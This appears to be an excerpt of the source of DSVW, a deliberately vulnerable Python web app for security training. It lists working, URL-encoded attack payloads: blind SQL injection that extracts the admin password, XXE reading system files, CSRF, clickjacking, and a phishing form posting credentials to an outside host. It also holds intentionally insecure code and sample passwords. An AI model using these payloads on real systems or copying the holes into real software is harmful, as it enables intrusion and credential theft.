...
import html, http.client, http.server, io, json, os, pickle, random, re, socket, socketserver, sqlite3, string, sys, \
    subprocess, time, traceback, urllib.parse, urllib.request, xml.etree.ElementTree  # Python 3 required
...
NAME, VERSION, GITHUB, AUTHOR, LICENSE = "Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)", "0.2b", "https" \
                                                                                                               "://github.com/stamparm/DSVW", "Miroslav Stampar (@stamparm)", "Unlicense (public domain) "
LISTEN_ADDRESS, LISTEN_PORT = "127.0.0.1", 65412
HTML_PREFIX, HTML_POSTFIX = "<!DOCTYPE html>\n<html>\n<head>\n<style>a {font-weight: bold; text-decoration: none; " \
                            "visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: " \
                            "line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: " \
                            "none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid " \
                            "black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; " \
                            "font-weight: bold}</style>\n<title>%s</title>\n</head>\n<body style='font: 12px " \
                            "monospace'>\n<script>function process(data) {alert(\"Surname(s) from JSON results: \" + " \
                            "Object.keys(data).map(function(k) {return data[k]}));}; var " \
                            "index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div " \
                            "style=\"position: absolute; top: 5px; right: 5px;\">Chosen language: <b>' + " \
                            "decodeURIComponent(document.location.hash.substring(index + 5)) + " \
                            "'</b></div>');</script>\n" % html.escape(
    NAME), "<div style=\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\">Powered by <a href=\"%s\" " \
           "style=\"font-weight: bold; text-decoration: none; visited: blue; color: blue\" target=\"_blank\">%s</a> (" \
           "v<b>%s</b>)</div>\n</body>\n</html>" % (
                            GITHUB, re.search(r"\(([^)]+)", NAME).group(1), VERSION)
USERS_XML = """<?xml version="1.0" encoding="utf-8"?><users><user 
id="0"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user
><user id="1"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user
><user id="2"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password
></user><user id="3"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945
</password></user></users> """
CASES = (("Blind SQL Injection (<i>boolean</i>)", "?id=2",
         ...
         ("Blind SQL Injection (<i>time</i>)", "?id=2",
          "/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2"
          "%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\" "
          "onclick=\"alert('checking if the second character for admin\\'s password is letter \\'e\\' (true in case "
          "of delayed response)')",
         ...
         "%3Croot%3E%26xxe%3B%3C%2Froot%3E" if os.name != "nt" else
         "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E"
         ...
         "https://www.owasp.org/index.php/XPATH_Injection"), ("Cross Site Request Forgery", "/?comment=",
                                                              "/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv"
                                                              "%2520style%253D%2522color%253Ared%253B%2520font-weight"
                                                              "%253A%2520bold%2522%253EI%2520quit%2520the%2520job"
                                                              "%253C%252Fdiv%253E%22%3E\" onclick=\"alert('please "
                                                              "visit \\'vulnerable\\' page to see what this click has "
                                                              "caused')",
                                                              "https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29"),
         ("Frame Injection (<i>phishing</i>)", "/?v=0.2",
          "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color"
         ...
         "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth"
         ...
         "http://www.gnucitizen.org/blog/frame-injection-fun/"), ("Clickjacking", None,
                                                                  "/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter"
                                                                  "%3Aalpha("
                                                                  "opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth"
                                                                  "%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop"
                                                                  "%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick"
                                                                  "%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1"
                                                                  ".biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert("
                                                                  "%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E",
                                                                  "https://www.owasp.org/index.php"
                                                                  "/Testing_for_Clickjacking_%28OTG-CLIENT-009%29"),
         ...
         "%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E"
         "%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert("
         "%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27"
         ")%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr"
         "%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D"
         "%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E",
         ...
         "executed remotely (true in case of delayed response)')" % urllib.parse.quote(
        ...
        try:
            if path == '/':
                if "id" in params:
                    ...
                    content += "<div><span>Result(s):</span></div><table><thead><th>id</th><th>username</th><th>name" \
                               "</th><th>surname</th></thead>%s</table>%s" % (
                    ...
                    if "comment" in params:
                        ...
                        content += "<div><span>Comment(s):</span></div><table><thead><th>id</th><th>comment</th><th" \
                                   ">time</th></thead>%s</table>%s" % (
                        "".join(
                ...
                re.sub(r"[^\w]", "", params.get("username", "")), "".join(
                    random.sample(string.ascii_letters + string.digits,
                                  20))) if cursor.fetchall() else "The username and/or password is incorrect<meta " \
                                                                  "http-equiv=\"Set-Cookie\" content=\"SESSIONID=; " \
